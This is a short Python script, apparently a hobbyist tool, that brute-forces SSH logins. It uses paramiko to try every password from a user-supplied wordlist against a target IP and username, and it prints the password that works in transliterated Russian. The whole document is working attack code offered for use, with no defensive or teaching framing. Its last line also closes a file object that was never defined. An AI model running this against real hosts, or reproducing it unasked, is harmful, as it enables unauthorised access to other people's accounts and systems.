import paramiko
import sys
import os

target = str(input(' target IP address: '))
username = str(input(' username: '))
password_file = str(input(' location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('DERJI PAROL: '+ password)
                 exit(0)
            elif response == 1: 
                print('OTVAL')
        except Exception as e:
            print(e)
        pass

input_file.close()
